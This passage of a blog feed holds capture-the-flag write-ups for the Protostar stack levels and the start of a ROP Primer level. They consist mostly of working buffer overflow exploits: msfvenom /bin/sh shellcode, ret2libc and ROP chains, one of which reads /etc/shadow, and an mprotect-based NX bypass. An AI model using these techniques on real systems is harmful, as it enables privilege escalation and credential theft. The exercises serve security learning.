</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> env <span class="nv">GREENIE</span><span class="o">=</span><span class="s2">&quot;`python -c &#39;print &quot;</span>A<span class="s2">&quot; * 64 + &quot;</span><span class="se">\x</span>0a<span class="se">\x</span>0d<span class="se">\x</span>0a<span class="se">\x</span>0d<span class="s2">&quot;&#39;`&quot;</span> ./stack2
</span><span class='line'><span class="go">you have correctly modified the variable</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack3</h2>

<p>Disassembling, like the exercise says, with objdump and retrieving the address
of the win() function yields the expected results:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -d stack3|grep win</span>
</span><span class='line'><span class="mh">08048424</span> <span class="p">&lt;</span><span class="nf">win</span><span class="p">&gt;:</span>
</span></code></pre></td></tr></table></div></figure>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;\x24\x84\x04\x08&quot;&#39;</span><span class="p">|</span>./stack3
</span><span class='line'><span class="go">calling function pointer, jumping to 0x08048424</span>
</span><span class='line'><span class="go">code flow successfully changed</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack4</h2>

<p>A poor man&rsquo;s fuzzer can be used to guess the EIP address (and while at it, to
take advantage of the redirect operator in gdb, like the exercise says):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * offset + &quot;B&quot; * 4&#39;</span> &gt;/tmp/dump
</span><span class='line'><span class="gp">$</span> gdb ./stack4
</span><span class='line'><span class="go">(gdb) r &lt;/tmp/dump</span>
</span></code></pre></td></tr></table></div></figure>


<p>The offset should be incremented until (76) the program crashes with a segfault
in the 0x42424242 address. Now that EIP is under control, the above can be used
to obtain the address of win:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -d stack4|grep win</span>
</span><span class='line'><span class="mh">080483f4</span> <span class="p">&lt;</span><span class="nf">win</span><span class="p">&gt;:</span>
</span></code></pre></td></tr></table></div></figure>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * 76 + &quot;\xf4\x83\x04\x08&quot;&#39;</span><span class="p">|</span>./stack4
</span><span class='line'><span class="go">code flow successfully changed</span>
</span><span class='line'><span class="go">Segmentation fault</span>
</span></code></pre></td></tr></table></div></figure>


<p>The padding, like the exercise says, is added by the compiler.</p>

<h2>stack5</h2>

<p>This was kind of tricky, since the stack isn&rsquo;t in the same place inside and
outside GDB. The environment and the arguments vector (ie argv) must be the
same.</p>

<p>First, brute-forced the number of bytes needed to overwrite EIP (76 in this
case) and obtained the address of the stack with GDB:</p>

<pre><code>$ python -c 'print "A" * 76 + "B" * 4 + "C" * 32' &gt;/tmp/boom
$ env - TERM=xterm PWD=$PWD gdb /opt/protostar/bin/stack5
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
TERM=xterm
PWD=/tmp
(gdb) r &lt;/tmp/boom
(gdb) info registers
(gdb) x/x $esp
0xbffffe30: 0x43434343
</code></pre>

<p>Generated the shellcode with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> msfvenom -p linux/x86/exec -f py -a x86 --platform linux <span class="nv">CMD</span><span class="o">=</span>/bin/sh
</span><span class='line'><span class="go">No encoder or badchars specified, outputting raw payload</span>
</span><span class='line'><span class="go">Payload size: 43 bytes</span>
</span><span class='line'><span class="go">buf =  &quot;&quot;</span>
</span><span class='line'><span class="go">buf += &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;</span>
</span><span class='line'><span class="go">buf += &quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08&quot;</span>
</span><span class='line'><span class="go">buf += &quot;\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53&quot;</span>
</span><span class='line'><span class="go">buf += &quot;\x89\xe1\xcd\x80&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As for the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">76</span>
</span><span class='line'><span class="n">esp</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffffe30</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span>  <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x89\xe1\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">esp</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, ensure that the environment is the same as the above (without changing
directories due to $PWD):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>   <span class="se">\</span>
</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD     \</span>
</span><span class='line'><span class="go">  /opt/protostar/bin/stack5</span>
</span><span class='line'><span class="go">id</span>
</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack6</h2>

<p>With the usual methodology, it was noticed that EIP is under control when
overwriting at least eighty characters. The traditional ret2libc with the
system function and faking a stack frame works as expected:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
</span><span class='line'><span class="n">sys</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>    <span class="c"># system(3)</span>
</span><span class='line'><span class="n">sh</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffb8</span><span class="p">)</span>     <span class="c"># /bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sys</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;FAKE&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sh</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>The /bin/sh address might need the usual guessing and setting a regular
environment inside and outside GDB:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                   <span class="se">\</span>
</span><span class='line'><span class="go">  env - SHELL=/bin/sh TERM=xterm PWD=$PWD       \</span>
</span><span class='line'><span class="go">  /opt/protostar/bin/stack6</span>
</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAA��AKE����</span>
</span><span class='line'><span class="go">id</span>
</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
</span></code></pre></td></tr></table></div></figure>


<p>As for the ROP one, I&rsquo;ve opted by using a rather pointless open(2), read(2),
write(2) and finally system(3) chain to play around a little. The gadgets
addresses can be obtained by using objdump. Jumping to the middle of a multiple
pop sequence might be needed and that&rsquo;s okay.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
</span><span class='line'>
</span><span class='line'><span class="c"># int open(const char *, int);</span>
</span><span class='line'><span class="n">openaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f537a0</span><span class="p">)</span>
</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048452</span><span class="p">)</span>
</span><span class='line'><span class="n">openpath</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffd6</span><span class="p">)</span>       <span class="c"># SHADOW variable.</span>
</span><span class='line'><span class="n">openflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>              <span class="c"># O_RDONLY</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ssize_t read(int, void *, size_t);</span>
</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f53c00</span><span class="p">)</span>
</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048576</span><span class="p">)</span>
</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">)</span>                <span class="c"># Only the standard ones are open.</span>
</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffff73c</span><span class="p">)</span>        <span class="c"># getpath() buffer.</span>
</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>              <span class="c"># 64 bytes.</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ssize_t write(int, const void *, size_t);</span>
</span><span class='line'><span class="n">writeaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f53c70</span><span class="p">)</span>
</span><span class='line'><span class="n">writefd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">)</span>               <span class="c"># stderr is unbuffered.</span>
</span><span class='line'><span class="n">writebuf</span> <span class="o">=</span> <span class="n">readbuf</span>
</span><span class='line'><span class="n">writecnt</span> <span class="o">=</span> <span class="n">readcnt</span>
</span><span class='line'>
</span><span class='line'><span class="c"># int system(const char *);</span>
</span><span class='line'><span class="n">sysaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>
</span><span class='line'><span class="n">pointless</span> <span class="o">=</span> <span class="s">&quot;FAKE&quot;</span>
</span><span class='line'><span class="n">syscmd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffc7</span><span class="p">)</span>         <span class="c"># SHELL variable.</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">openaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">openpath</span> <span class="o">+</span> <span class="n">openflgs</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">writeaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">writefd</span> <span class="o">+</span> <span class="n">writebuf</span> <span class="o">+</span> <span class="n">writecnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sysaddr</span> <span class="o">+</span> <span class="n">pointless</span> <span class="o">+</span> <span class="n">syscmd</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>Beware that the environment inherited from the parent may play tricks due to not
being the same. Executing it through a clean environment all the time, such as
the one below, solves this kind of issues:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                                  <span class="se">\</span>
</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD SHELL=/bin/sh SHADOW=/etc/shadow   \</span>
</span><span class='line'><span class="go">  /opt/protostar/bin/stack6</span>
</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�7��AAAAAAAAAAAA�7��R��</span>
</span><span class='line'><span class="gp">root:$6$gOA4/iAf$</span>EMw.4yshZLZxjlf./VmnEVQ20QsEmdzZa73csPGYGG6KC.rid
</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The stack with the above ROP will look like:</p>

<pre><code>H +---------------------+
  | ret (the variable)  |
  | buffer [0x41 * 80]  | &lt;= 0xbffff73c
  | open(2)             | &lt;= 0xb7f537a0
  | POP POP RET         | &lt;= 0x08048452
  | /etc/shadow         | &lt;= SHADOW variable.
  | openflgs            | &lt;= O_RDONLY
  | read(2)             | &lt;= 0xb7f53c00
  | POP POP POP RET     | &lt;= 0x08048576
  | 0x3                 |
  | buffer              | &lt;= 0xbffff73c
  | 0x40                |
  | write(2)            | &lt;= 0xb7f53c70
  | POP POP POP RET     | &lt;= 0x08048576
  | 0x2                 |
  | buffer              | &lt;= 0xbffff73c
  | 0x40                |
  | system(3)           | &lt;= 0xb7ecffb0
  | FAKE                |
  | /bin/sh             | &lt;= SHELL variable.
L +---------------------+
</code></pre>

<h2>stack7</h2>

<p>Like the one above, this also places restrictions in the address that we are
allowed to jump to. Therefore, like the exercise says we need to bypass this
restriction by returning to a text section.</p>

<p>Decided with a straight ret opcode one, that pops the last value from the stack
and updates EIP to that address (the system(3) function).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080484c2</span><span class="p">)</span>    <span class="c"># the ret instruction (frame_dummy)</span>
</span><span class='line'><span class="n">sys</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>    <span class="c"># system(3)</span>
</span><span class='line'><span class="n">sh</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffbd</span><span class="p">)</span>     <span class="c"># /bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sys</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;FAKE&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sh</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                   <span class="se">\</span>
</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD SHELL=/bin/sh       \</span>
</span><span class='line'><span class="go">  /opt/protostar/bin/stack7</span>
</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AKE��</span>
</span><span class='line'><span class="go">id</span>
</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP Primer: 0.2]]></title>
    <link href="http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2/"/>
    <updated>2015-11-12T01:31:07+00:00</updated>
    <id>http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2</id>
    <content type="html"><![CDATA[<h2>level0</h2>

<p>Started, as usual, by fetching the number of characters needed to overflow the
name. The regular MSF pattern-create (or its alternatives like peda) approach
can be used. In this case consider that 44 bytes are needed to overflow.</p>

<p>The system(3) function doesn&rsquo;t seem to be linked in the library. On purpose,
most likely. One can use the mprotect(2) system call to bypass the NX protection
(which isn&rsquo;t allowed under PaX) on the stack by making a small portion of its
pages as executable and read a shellcode into that location from standard input.</p>

<p>The Python code below was used to create two additional (fake) stack frames:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">44</span>
</span><span class='line'>
</span><span class='line'><span class="n">mprotectaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080523e0</span><span class="p">)</span>
</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048882</span><span class="p">)</span>
</span><span class='line'><span class="n">mprotectarg1</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffdf000</span><span class="p">)</span> <span class="c"># Stack address.</span>
</span><span class='line'><span class="n">mprotectlen</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>       <span class="c"># Address length.</span>
</span><span class='line'><span class="n">mprotectflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">)</span>        <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
</span><span class='line'>
</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080517f0</span><span class="p">)</span>
</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>              <span class="c"># Read from standard input.</span>
</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">mprotectarg1</span>
</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">mprotectlen</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">mprotectaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">mprotectarg1</span> <span class="o">+</span> <span class="n">mprotectlen</span> <span class="o">+</span> <span class="n">mprotectflgs</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readbuf</span>                    <span class="c"># Jump to the marked stack area.</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>The (not encoded) shellcode was generated using msfvenom:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> msfvenom -p linux/x86/exec -f py <span class="nv">CMD</span><span class="o">=</span>/bin/sh 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>    <span class="se">\</span>
</span><span class='line'><span class="go">    tail -n+6|                                          \</span>
</span><span class='line'><span class="go">    sed -e &#39;s,buf += &quot;,,&#39; -e &#39;s,&quot;,,g&#39;|                  \</span>
</span><span class='line'><span class="go">    tr -d &#39;\n&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And, finally, executed with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
